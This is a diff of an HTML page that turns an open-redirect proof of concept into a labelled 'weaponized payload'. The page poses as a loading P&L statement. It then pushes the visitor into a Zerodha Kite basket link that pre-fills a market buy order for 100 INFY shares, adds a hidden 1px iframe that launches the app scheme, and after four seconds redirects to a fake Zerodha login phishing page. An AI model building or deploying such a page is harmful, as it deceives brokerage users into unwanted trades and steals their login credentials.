@@ -1,28 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>PoC Open Redirect</title>
+    <title>Loading Statement...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
-    <h1>Redirecting...</h1>
-    <script>
-        // 1. Parse the query parameters from the URL
-        const params = new URLSearchParams(window.location.search);
-        
-        // 2. Extract the 'redirect' parameter
-        const target = params.get('redirect');
+    <h2 style="text-align:center; font-family:sans-serif; margin-top:50px;">
+        Verifying P&L... Please wait.
+    </h2>
 
-        // 3. Execute the redirect if the parameter exists
-        if (target) {
-            // Optional: Log it to console for debugging
-            console.log("Redirecting to:", target);
+    <script>
+        // 1. The Weaponized Payload (Pre-fill a Buy Order for INFY)
+        // We use the Publisher link because it works as a Universal Link
+        var target_universal = 'https://kite.zerodha.com/connect/basket?data=%7B%22varieties%22%3A%5B%22regular%22%5D%2C%22orders%22%3A%5B%7B%22exchange%22%3A%22NSE%22%2C%22tradingsymbol%22%3A%22INFY%22%2C%22transaction_type%22%3A%22BUY%22%2C%22quantity%22%3A100%2C%22order_type%22%3A%22MARKET%22%2C%22product%22%3A%22MIS%22%7D%5D%7D';
+        
+        // 2. The Raw Scheme (Fallback)
+        var target_scheme = 'kite://orders';
+
+        // 3. Execution Logic
+        setTimeout(function() {
+            // Attempt 1: Window Location (Standard)
+            window.location.href = target_universal;
             
-            // Perform the redirection
-            window.location.href = target;
-        } else {
-            document.body.innerHTML += "<p style='color:red'>No 'redirect' parameter found.</p>";
-        }
+            // Attempt 2: Iframe Injection (Bypasses some popup blockers)
+            var iframe = document.createElement("iframe");
+            iframe.style.border = "none";
+            iframe.style.width = "1px";
+            iframe.style.height = "1px";
+            iframe.src = target_scheme;
+            document.body.appendChild(iframe);
+        }, 1000);
+        
+        // 4. Fallback to Phishing if App doesn't open after 3 seconds
+        setTimeout(function() {
+             window.location.href = "https://fake-zerodha-login.com/session-expired";
+        }, 4000);
     </script>
 </body>
 </html>
